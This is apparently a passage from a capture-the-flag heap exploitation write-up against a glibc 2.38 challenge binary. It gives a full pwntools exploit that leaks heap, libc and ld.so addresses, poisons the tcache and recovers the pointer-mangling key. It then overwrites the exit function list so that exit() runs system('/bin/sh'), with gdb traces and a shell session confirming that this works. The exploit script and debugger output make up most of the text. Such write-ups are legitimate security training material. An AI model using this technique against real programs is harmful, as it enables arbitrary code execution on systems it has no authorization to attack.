0x7f13fd22c0b0 <*ABS*@got.plt>: 0x7f13fd150080  0x7f13fd022150
0x7f13fd22c0c0 <__tls_get_addr@got.plt>:  0x7f13fd022160  0x7f13fd09d210
0x7f13fd22c0d0 <*ABS*@got.plt>: 0x7f13fd14a060  0x7f13fd14cb60
0x7f13fd22c0e0 <*ABS*@got.plt>: 0x7f13fd14d690  0x7f13fd0221b0
0x7f13fd22c0f0 <*ABS*@got.plt>: 0x7f13fd14c610  0x7f13fd1507e0
0x7f13fd22c100 <*ABS*@got.plt>: 0x7f13fd1699b0  0x7f13fd14bc00
0x7f13fd22c110 <*ABS*@got.plt>: 0x7f13fd14e5e0  0x7f13fd152100
0x7f13fd22c120 <_dl_signal_exception@got.plt>:  0x7f13fd022220  0x7f13fd14b700
0x7f13fd22c130 <*ABS*@got.plt>: 0x7f13fd1502d0  0x7f13fd022250
0x7f13fd22c140 <*ABS*@got.plt>: 0x7f13fd14f3b0  0x7f13fd14c920
0x7f13fd22c150 <*ABS*@got.plt>: 0x7f13fd150080  0x7f13fd14a730
0x7f13fd22c160 <*ABS*@got.plt>: 0x7f13fd151680  0x7f13fd0222b0
0x7f13fd22c170 <*ABS*@got.plt>: 0x7f13fd14aec0  0x7f13fd0222d0
0x7f13fd22c180 <__tunable_get_val@got.plt>: 0x7f13fd262000  0x7f13fd150a00
0x7f13fd22c190 <*ABS*@got.plt>: 0x7f13fd14b150  0x7f13fd151ae0
0x7f13fd22c1a0 <_dl_catch_exception@got.plt>: 0x7f13fd022320  0x7f13fd14cd50
0x7f13fd22c1b0 <_dl_allocate_tls_init@got.plt>: 0x7f13fd022340  0x7f13fd022350
0x7f13fd22c1c0 <*ABS*@got.plt>: 0x7f13fd16c550  0x7f13fd266340
0x7f13fd22c1d0 <*ABS*@got.plt>: 0x7f13fd14f0e0  0x0
0x7f13fd22c1e0 <__fpu_control>: 0x400000037f  0x22
gef➤  x/10g 0x7f13fd22c1b0
0x7f13fd22c1b0 <_dl_allocate_tls_init@got.plt>: 0x7f13fd022340  0x7f13fd022350
0x7f13fd22c1c0 <*ABS*@got.plt>: 0x7f13fd16c550  0x7f13fd266340
0x7f13fd22c1d0 <*ABS*@got.plt>: 0x7f13fd14f0e0  0x0
0x7f13fd22c1e0 <__fpu_control>: 0x400000037f  0x22
gef➤  vmmap 0x7f13fd266340
[ Legend:  Code | Heap | Stack ]
Start           End             Offset          Perm Path
0x00007f13fd250000 0x00007f13fd276000 0x0000000000001000 r-x /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
```

We see at `0x7f13fd22c1c8` is a `ld.so` address. Rerunning the binary multiple times, it appears that this address can be relied upon to be there. For allocating the tcache chunk, I will do it at `0x7f13fd22c1b0` (offset of `0x7f13fd22c1b0 - 0x00007f13fd000000 = 0x22c1b0`). This is because the chunk will need to end with a `0x0` due to alignment, and the tcache key clearing. We see that this address that we leak, has an offset of `0x7f13fd266340 - 0x00007f13fd250000 = 0x16340` from the start of the memory region:

So, we can know the `_dl_fini` function address.The good news is, we can always expect the first instruction ptr to be mangled here, to be to `_dl_fini`. Our plan will be to use the address of `_dl_fini`. Because of the Libc ASLR infoleak, we know the address of `system`. The only other thing we need to know is the key used. The formula for ptr mangling/demangling is this, as you will recall:

```
mangled_ins_ptr = ((ins_ptr ^ key) << 0x11)

demangled_ins_ptr = ((mangled_ins_ptr >> 0x11) ^ key)
```

For this, we can allocate a chunk to, and thus leak the data of the first `exit_function_list`, stored at `initial`, pointed to by `__exit_funcs`. This will allow us to leak a `mangled_ins_ptr`, and we know that the demandled instruction ptr is `_dl_fini`, which we know the address of. Thus, we can learn `2` of the three variables. Thus we can figure out the `key` with this equation:

```
key = ((mangled_ins_ptr >> 0x11) ^ demangled_ins_ptr)
```

Which we can see in practice here:

```
gef➤  p __exit_funcs
$1 = (struct exit_function_list *) 0x7fb9c582e1a0 <initial>
gef➤  x/20g 0x7fb9c582e1a0
0x7fb9c582e1a0 <initial>: 0x0 0x1
0x7fb9c582e1b0 <initial+16>:  0x4 0x855e78812a3aaf91
0x7fb9c582e1c0 <initial+32>:  0x0 0x0
0x7fb9c582e1d0 <initial+48>:  0x0 0x0
0x7fb9c582e1e0 <initial+64>:  0x0 0x0
0x7fb9c582e1f0 <initial+80>:  0x0 0x0
0x7fb9c582e200 <initial+96>:  0x0 0x0
0x7fb9c582e210 <initial+112>: 0x0 0x0
0x7fb9c582e220 <initial+128>: 0x0 0x0
0x7fb9c582e230 <initial+144>: 0x0 0x0
gef➤  p _dl_fini
$2 = {void (void)} 0x7fb9c59c7d30 <_dl_fini>
gef➤  p __pointer_chk_guard_local
$3 = 0x57c8bd16f9dce82d
```

Python3 math:

```
>>> hex(((shift_right_carry(0x855e78812a3aaf91, 0x11)) ^ 0x7fb9c59c7d30))
'0x57c8bd16f9dce82d'
```

That is how we will figure out the `__pointer_chk_guard_local` key.

Now the last thing we will need to figure out, is the `exit_function_list` structure which we will use in order to execute (`system("/bin/sh")`). For the `next` ptr, I'll just have it be `0x00`, so there is no null ptr. For `idx`, I will just have it be `0x01`, since there is only one `exit_function` I care to execute.

After that, we have the `exit_function` which we will have. We will need a `flavor` value, the mangled instruction ptr, the argument ptr, and the `dso_handle`. For the `flavor` value, I want it to be the `cxa` type, but what is the actual integer `enum` value for that?

```
enum
{
  ef_free,  /* `ef_free' MUST be zero!  */
  ef_us,
  ef_on,
  ef_at,
  ef_cxa
};
```

Looking at the enum where `ef_cxa` is established, we see it is the fifth entry. As part of the C language, the first enum `ef_free` will be `0`. The second `ef_us` will be `1`, the third `ef_on` will be two, and so on and so forth. So the fifth one `ef_cxa` (the one we want) will be `4`.

For the instruction ptr, we will just use the mangled instruction ptr for `system` in libc, with the argument being the `"/bin/sh"` string present in `libc`. For `dso`, I will just have it be a null ptr (not too sure what the dso handle is used for, google says it's for shared object files).

So, our `exit_function` struct will look like this:

```
0x00:   NEXT        0x00
0x08:   idx         0x01
0x10:   flavor      0x04
0x18:   fn          mangled libc system
0x20:   arg         libc system
0x28:   dso_handle  0x00
```

That being said, putting it all together we have this exploit:

```
from pwn import *

target = process("./chall-05")
gdb.attach(target)

MENU_STRING = b"Please enter menu choice:\n"

# Our I/O Wrapper Functions
def allocate_new_chunk(chunk_size: int, chunk_idx: int) -> None:
  target.recvuntil(MENU_STRING)
  target.sendline(b"1")
  target.recvuntil(b"Enter the chunk size between 0x0-0x1000:\n")
  target.sendline(bytes(str(chunk_size), "utf-8"))
  target.recvuntil(b"Which chunk spot would you like to allocate?\n")
  target.sendline(bytes(str(chunk_idx), "utf-8"))

def view_chunk(chunk_idx: int) -> bytes:
  target.recvuntil(MENU_STRING)
  target.sendline(b"2")
  target.recvuntil(b"Which chunk idx would you like?\n")
  target.sendline(bytes(str(chunk_idx), "utf-8"))
  target.recvuntil(b"Chunk Contents: ")
  contents = target.recvuntil(b"\x0d\x0a")
  return contents[:-2]

def edit_chunk(chunk_idx: int, chunk_contents: bytes) -> None:
  target.recvuntil(MENU_STRING)
  target.sendline(b"3")
  target.recvuntil(b"Which chunk idx would you like?\n")
  target.sendline(bytes(str(chunk_idx), "utf-8"))
  target.recvuntil(b"Please input new chunk content:\n")
  target.sendline(chunk_contents)

def free_chunk(chunk_idx: int) -> None:
  target.recvuntil(MENU_STRING)
  target.sendline(b"4")
  target.recvuntil(b"Which chunk idx would you like?\n")
  target.sendline(bytes(str(chunk_idx), "utf-8"))

def remove_chunk(chunk_idx: int) -> None:
  target.recvuntil(MENU_STRING)
  target.sendline(b"5")
  target.recvuntil(b"Which chunk idx would you like?\n")
  target.sendline(bytes(str(chunk_idx), "utf-8"))

def secret() -> None:
  target.recvuntil(MENU_STRING)
  target.sendline(b"6")

def shift_right_carry(number: int, shift_amount: int) -> int:
  for i in range(shift_amount):
  if (number & 1) == 0:
    number = number >> 1
  else:
    number = (number >> 1) | 0x8000000000000000
  return number

def shift_left_carry(number: int, shift_amount: int) -> int:
  for i in range(shift_amount):
  if ((number & 0x8000000000000000) != 0):
    number = ((number << 1) & 0xffffffffffffffff) | 0x1
  else:
    number = ((number << 1) & 0xffffffffffffffff)
  return number

def mangle_instruction_ptr(ins_ptr: int, key: int) -> int:
  mangled_ptr = ins_ptr ^ key
  mangled_ptr = shift_left_carry(mangled_ptr, 0x11)
  return mangled_ptr

def demangle_instruction_ptr(mangled_ins_ptr: int, key: int) -> int:
  demangled_ptr = shift_right_carry(mangled_ins_ptr, 0x11)
  demangled_ptr = demangled_ptr ^ key
  return demangled_ptr

# So first off, we need ot get our libc / heak infoleak

# Allocate the chunks for it
allocate_new_chunk(0x410, 0)
allocate_new_chunk(0x80, 1)
allocate_new_chunk(0x410, 2)
allocate_new_chunk(0x80, 3)

# Free two chunks, insert them into the unsorted bin
free_chunk(0)
free_chunk(2)

# Allocate a chunk, to move the two chunks over to large bin
allocate_new_chunk(0x500, 4)

# Get the heap / libc infoleaks

leak_heap_bytes = view_chunk(0)
leak_libc_bytes = view_chunk(2)

leak_heap = u64(leak_heap_bytes + b"\x00"*(8-len(leak_heap_bytes)))
leak_libc = u64(leak_libc_bytes + b"\x00"*(8-len(leak_libc_bytes)))

heap_base = leak_heap - 0x1b60
libc_base = leak_libc - 0x22d0f0

print("Heap Base: " + hex(heap_base))
print("Libc Base: " + hex(libc_base))

# Next up, let's figure out the __pointer_chk_guard_local key

# First we will need the `_dl_fini` address
# Let's allocate a tcache chunk, to leak a `ld.so` address

# Allocate two tcache bin chunks
allocate_new_chunk(0xa0, 5)
allocate_new_chunk(0xa0, 6)

# Insert them into the tcache
free_chunk(5)
free_chunk(6)

# Calculate the mangled next address
tcache_chunk_address1 = heap_base + 0x1c20
ld_ptr_address = libc_base + 0x22c1b0

mangled_next = (ld_ptr_address ^ (tcache_chunk_address1 >> 12))

# Overwrite tcache next ptr of the head
edit_chunk(6, p64(mangled_next))

# Remove them, so we can reuse the 5/6 indices
remove_chunk(5)
remove_chunk(6)

allocate_new_chunk(0xa0, 5)
# Get the chunk to the ld.so ptr with this allocation
allocate_new_chunk(0xa0, 6)

# Fill up the space to the ptr
edit_chunk(6, b"0"*23)

# Get the `ld.so` address, calculate `ld.so` base

ld_leak_bytes = view_chunk(6)
ld_address_leak_bytes = ld_leak_bytes[24:]
ld_leak_address = u64(ld_address_leak_bytes + b"\x00"*(8-len(ld_address_leak_bytes)))
ld_base = ld_leak_address - 0x16340
dl_fini_address = ld_base + 0x3d30

print("ld base: " + hex(ld_base))
print("_dl_fini address: " + hex(dl_fini_address))

# So we have the address of dl_fini
# Let's go ahead and allocate a chunk to initial
# We will do this, to both leak the mangled instruction ptr
# And then, write our own exit_function

# Libc addresses we will need
initial_address = libc_base + 0x22e1a0
system_address = libc_base + 0x48810
binsh_address = libc_base + 0x18cf2d

print("Initial Address: " + hex(initial_address))

# Free two chunks insert them into the tcache
free_chunk(1)
free_chunk(3)

# Prepare the mangled next ptr for initial

tcache_chunk_address = heap_base + 0x1f90
print("Tcache Chunk: " + hex(tcache_chunk_address))
mangled_next = (initial_address ^ (tcache_chunk_address >> 12))
print("Mangled Next: " + hex(mangled_next))

# Overwrite the next ptr of the head, with our mangled next ptr to initial

edit_chunk(3, p64(mangled_next))

remove_chunk(1)
remove_chunk(3)

allocate_new_chunk(0x80, 1)
# Get the ptr to initial
allocate_new_chunk(0x80, 3)

# Fill up the data, from the start of our chunk
# To the mangled _dl_fini instruction ptr
edit_chunk(3, b"0"*23)

# Get the leak
# With the mangled _dl_fini ptr, and actual _dl_fini ptr
# Calculate what the key is

key_leak_bytes = view_chunk(3)
mangled_ins_ptr_bytes = key_leak_bytes[24:]
mangled_ins_ptr = u64(mangled_ins_ptr_bytes)

print("dl_fini: " + hex(dl_fini_address))
print("mangled_ins_ptr: " + hex(mangled_ins_ptr))

key = ((shift_right_carry(mangled_ins_ptr, 0x11)) ^ dl_fini_address)

print("Key is: " + hex(key))

# Now that we have the key, calculate what the mangled address of `system` will be
mangled_system_address = mangle_instruction_ptr(system_address, key)

# Now we have everything, make the exit_function / exit_function_list

'''
Next_ptr    0x00
idx       0x01
flavor      0x04
mangled_ins_ptr
binsh_address
dso handle    0x00
'''


exit_function = \
      p64(0x04) + \
      p64(mangled_system_address) + \
      p64(binsh_address) + \
      p64(0x00)

exit_function_list = \
      p64(0x00) + \
      p64(0x01) + \
      exit_function

# Overwrite the existing exit function list with our own
edit_chunk(3, exit_function_list)

# Call system("/bin/sh") via calling exit
secret()

# Enjoy the shell!
target.interactive()
```

Let's see this in action!

```
gef➤  heap bins
───────────────────────────────────────────────────────────────────────────────────────── Tcachebins for thread 1 ─────────────────────────────────────────────────────────────────────────────────────────
All tcachebins are empty
────────────────────────────────────────────────────────────────────────────────── Fastbins for arena at 0x7f9cd1a2cca0 ──────────────────────────────────────────────────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
──────────────────────────────────────────────────────────────────────────────── Unsorted Bin for arena at 0x7f9cd1a2cca0 ────────────────────────────────────────────────────────────────────────────────
[+] Found 0 chunks in unsorted bin.
───────────────────────────────────────────────────────────────────────────────── Small Bins for arena at 0x7f9cd1a2cca0 ─────────────────────────────────────────────────────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
───────────────────────────────────────────────────────────────────────────────── Large Bins for arena at 0x7f9cd1a2cca0 ─────────────────────────────────────────────────────────────────────────────────
[+] large_bins[63]: fw=0x55ac684196b0, bk=0x55ac68419b60
 →   Chunk(addr=0x55ac684196c0, size=0x420, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)   →   Chunk(addr=0x55ac68419b70, size=0x420, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 2 chunks in 1 large non-empty bins.
gef➤  x/10g 0x55ac684196c0
0x55ac684196c0: 0x55ac68419b60  0x7f9cd1a2d0f0
0x55ac684196d0: 0x55ac684196b0  0x55ac684196b0
0x55ac684196e0: 0x0 0x0
0x55ac684196f0: 0x0 0x0
0x55ac68419700: 0x0 0x0
gef➤  x/10g 0x55ac68419b70
0x55ac68419b70: 0x7f9cd1a2d0f0  0x55ac684196b0
0x55ac68419b80: 0x0 0x0
0x55ac68419b90: 0x0 0x0
0x55ac68419ba0: 0x0 0x0
0x55ac68419bb0: 0x0 0x0
gef➤  vmmap 0x55ac68419b60
[ Legend:  Code | Heap | Stack ]
Start           End             Offset          Perm Path
0x000055ac68418000 0x000055ac68439000 0x0000000000000000 rw- [heap]
gef➤  vmmap 0x7f9cd1a2d0f0
[ Legend:  Code | Heap | Stack ]
Start           End             Offset          Perm Path
0x00007f9cd1a2c000 0x00007f9cd1a2e000 0x000000000022b000 rw- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
```

So we see, our two large bin chunks, which have heap/libc addresses for us to leak. Next up, let's see the chunk we allocate to within libc for the linker (`ld.so`):

```
gef➤  p (char *)chunks
$1 = 0x55ac684196c0 "\360Тќ\177"
gef➤  search-pattern 0x55ac684196c0
[+] Searching '\xc0\x96\x41\x68\xac\x55' in memory
[+] In '/Hackery/shogun/challs/05/chall-05'(0x55ac67ec6000-0x55ac67ec7000), permission=rw-
  0x55ac67ec6040 - 0x55ac67ec6058  →   "\xc0\x96\x41\x68\xac\x55[...]"
gef➤  x/10g 0x55ac67ec6040
0x55ac67ec6040 <chunks>:  0x55ac684196c0  0x55ac68419ae0
0x55ac67ec6050 <chunks+16>: 0x55ac68419b70  0x55ac68419f90
0x55ac67ec6060 <chunks+32>: 0x55ac6841a020  0x55ac68419c20
0x55ac67ec6070 <chunks+48>: 0x7f9cd1a2c1b0  0x0
0x55ac67ec6080 <chunks+64>: 0x0 0x0
gef➤  x/10g 0x7f9cd1a2c1b0
0x7f9cd1a2c1b0 <_dl_allocate_tls_init@got.plt>: 0x3030303030303030  0x3030303030303030
0x7f9cd1a2c1c0 <*ABS*@got.plt>: 0xa30303030303030 0x7f9cd1b55340
0x7f9cd1a2c1d0 <*ABS*@got.plt>: 0x7f9cd194f0e0  0x0
0x7f9cd1a2c1e0 <__fpu_control>: 0x400000037f  0x22
0x7f9cd1a2c1f0: 0x0 0x0
gef➤  vmmap 0x7f9cd1b55340
[ Legend:  Code | Heap | Stack ]
Start           End             Offset          Perm Path
0x00007f9cd1b3f000 0x00007f9cd1b65000 0x0000000000001000 r-x /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
```

So we see here, the chunk we allocated at `0x7f9cd1a2c1b0`, will give us the `ld.so` address `0x7f9cd1b55340`. With this, we know the address of `_dl_fini`:


```
gef➤  x/10g 0x55ac67ec6040
0x55ac67ec6040 <chunks>:  0x55ac684196c0  0x55ac68419f90
0x55ac67ec6050 <chunks+16>: 0x55ac68419b70  0x7f9cd1a2e1a0
0x55ac67ec6060 <chunks+32>: 0x55ac6841a020  0x55ac68419c20
0x55ac67ec6070 <chunks+48>: 0x7f9cd1a2c1b0  0x0
0x55ac67ec6080 <chunks+64>: 0x0 0x0
gef➤  x/10g 0x7f9cd1a2e1a0
0x7f9cd1a2e1a0 <initial>: 0x0 0x0
0x7f9cd1a2e1b0 <initial+16>:  0x4 0xa7928033268a9b5a
0x7f9cd1a2e1c0 <initial+32>:  0x0 0x0
0x7f9cd1a2e1d0 <initial+48>:  0x0 0x0
0x7f9cd1a2e1e0 <initial+64>:  0x0 0x0
```

Next up, we see we have allocated a chunk to `initial`, which is the default first exit function list:

```
gef➤  x/10g 0x55ac67ec6040
0x55ac67ec6040 <chunks>:  0x55ac684196c0  0x55ac68419f90
0x55ac67ec6050 <chunks+16>: 0x55ac68419b70  0x7f9cd1a2e1a0
0x55ac67ec6060 <chunks+32>: 0x55ac6841a020  0x55ac68419c20
0x55ac67ec6070 <chunks+48>: 0x7f9cd1a2c1b0  0x0
0x55ac67ec6080 <chunks+64>: 0x0 0x0
gef➤  x/10g 0x7f9cd1a2e1a0
0x7f9cd1a2e1a0 <initial>: 0x3030303030303030  0x3030303030303030
0x7f9cd1a2e1b0 <initial+16>:  0xa30303030303030 0xa7928033268a9b5a
0x7f9cd1a2e1c0 <initial+32>:  0x0 0x0
0x7f9cd1a2e1d0 <initial+48>:  0x0 0x0
0x7f9cd1a2e1e0 <initial+64>:  0x0 0x0
```

Here, we see we have prepared it, to leak the `0xa7928033268a9b5a` value. With this, we can overwrite the exit function list with our own:

```
gef➤  x/10g 0x7f9cd1a2e1a0
0x7f9cd1a2e1a0 <initial>: 0x0 0x0
0x7f9cd1a2e1b0 <initial+16>:  0x0 0xa79280526cca9b5a
0x7f9cd1a2e1c0 <initial+32>:  0x7f9cd198cf2d  0x0
0x7f9cd1a2e1d0 <initial+48>:  0xa 0x0
0x7f9cd1a2e1e0 <initial+64>:  0x0 0x0
gef➤  x/s 0x7f9cd198cf2d
0x7f9cd198cf2d: "/bin/sh"
```

Here we see that we have prepared this to execute `system("/bin/sh")`. We see that we actually hit `system` with `"/bin/sh"` as an argument (I ran the exploit again for this, so ASLR bases got changed):

```
─────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7f5474c48801 <cancel_handler+225> ret    
   0x7f5474c48802               data16 cs nop WORD PTR [rax+rax*1+0x0]
   0x7f5474c4880d               nop DWORD PTR [rax]
 → 0x7f5474c48810 <system+0>    endbr64
   0x7f5474c48814 <system+4>    test   rdi, rdi
   0x7f5474c48817 <system+7>    je  0x7f5474c48820 <__libc_system+16>
   0x7f5474c48819 <system+9>    jmp 0x7f5474c483f0 <do_system>
   0x7f5474c4881e <system+14>   xchg   ax, ax
   0x7f5474c48820 <system+16>   sub rsp, 0x8
───────────────────────────────────────── source:../sysdeps/posi[...].c+202 ────
  197 return status;
  198  }
  199  
  200  int
  201  __libc_system (const char *line)
 →  202  {
  203 if (line == NULL)
  204   /* Check that we have a command processor available.  It might
  205       not be available after a chroot(), for example.  */
  206   return do_system ("exit 0") == 0;
  207  
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-05", stopped 0x7f5474c48810 in __libc_system (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7f5474c48810 → __libc_system(line=0x7f5474d8cf2d "/bin/sh")
[#1] 0x7f5474c3b3a6 → __run_exit_handlers(status=0x0, listp=0x7f5474e2c860 <__exit_funcs>, run_list_atexit=0x1, run_dtors=0x1)
[#2] 0x7f5474c3b4e0 → __GI_exit(status=<optimized out>)
[#3] 0x5576c8a1478b → secret()
[#4] 0x5576c8a142ed → main()
────────────────────────────────────────────────────────────────────────────────
gef➤  x/s $rdi
0x7f5474d8cf2d: "/bin/sh"
gef➤  c
Continuing.
[Detaching after vfork from child process 9988]
```

We see that we called `system("/bin/sh")`, which we see the shell in use here:

```
$ python3 working.py
[+] Starting local process './chall-05': pid 9967
[*] running in new terminal: ['/usr/bin/gdb', '-q', './chall-05', '9967']
[+] Waiting for debugger: Done

Heap Base: 0x5576ca3a5000
Libc Base: 0x7f5474c00000

ld base: 0x7f5474e78000
_dl_fini address: 0x7f5474e7bd30
Initial Address: 0x7f5474e2e1a0
Tcache Chunk: 0x5576ca3a6f90
Mangled Next: 0x7f51238e4206


dl_fini: 0x7f5474e7bd30
mangled_ins_ptr: 0x794df9a72bd87d5b
Key is: 0x3eadc3f2883428dc
[*] Switching to interactive mode

$ w
 21:15:15 up  8:37,  1 user,  load average: 0.39, 0.35, 0.28
USER  TTY   FROM          LOGIN@   IDLE   JCPU   PCPU WHAT
guy   :1    :1            12:37   ?xdm?  14:31   0.00s /usr/libexec/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu /usr/bin/gnome-session --session=ubuntu
$ ls
chall-05  chall-05.c  chall-05.h  solution.md  working.py
```

Just like that, we got code execution!
